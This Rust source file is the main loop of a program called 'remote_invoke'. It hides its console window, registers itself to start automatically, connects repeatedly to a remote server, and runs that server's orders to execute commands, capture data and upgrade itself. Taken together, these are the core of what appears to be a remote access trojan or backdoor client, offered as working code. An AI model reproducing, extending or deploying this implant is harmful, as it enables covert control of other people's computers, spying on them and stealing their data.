#![windows_subsystem = "windows"]

use std::env::current_exe;
use std::time::Duration;
use anyhow::{anyhow, Result};
use auto_launch::AutoLaunch;
use tokio::time::sleep;
use bytes::Buf;
use lazy_static::lazy_static;
use tokio::net::TcpStream;
use variable_len_reader::VariableReadable;
use crate::links::try_select_link;
use crate::network::{recv, send, send_err};

mod links;
mod network;
mod pinging;
mod upgrade;
mod capture;
mod command;

lazy_static! {
    pub static ref AUTO_LAUNCHER: Result<AutoLaunch> = if cfg!(release) {
        let path = current_exe()?;
        let path = path.to_str().ok_or(anyhow!("Failed to get current exe"))?;
        Ok(AutoLaunch::new(&"remote_invoke", path, &[] as &[&str]))
    } else {
        Err(anyhow!("Auto launcher is disabled in debug mode."))
    };
}

#[tokio::main]
async fn main() {
    loop {
        if let Ok(launcher) = AUTO_LAUNCHER.as_ref() {
            if match launcher.is_enabled() { Ok(success) => !success, Err(_) => true, } {
                let _ = launcher.enable();
            }
        }
        if main_loop().await.is_ok() {
            break;
        }
        sleep(Duration::from_secs(10)).await;
    }
}

async fn main_loop() -> Result<()> {
    let mut stream = if cfg!(release) {
        try_select_link().await?.ok_or(anyhow!("No available server link."))?
    } else {
        TcpStream::connect("127.0.0.1:25565").await?
    };
    loop {
        let mut bytes = recv(&mut stream).await?.reader();
        macro_rules! run_func {
            ($func: ident, $stream: expr) => {
                send(&mut stream, &[]).await?;
                if let Err(e) = $func::$func($stream).await {
                    send_err($stream, &e.to_string()).await?;
                    break;
                }
            };
        }
        match &bytes.read_string()? as &str {
            "pinging" => { run_func!(pinging, &mut stream); },
            "upgrade" => { run_func!(upgrade, &mut stream); break; },
            "command" => { run_func!(command, &mut stream); },
            "capture" => { run_func!(capture, &mut stream); },
            _ => {
                send_err(&mut stream, &"Unknown function.").await?;
                continue;
            }
        };
    }
    Ok(())
}
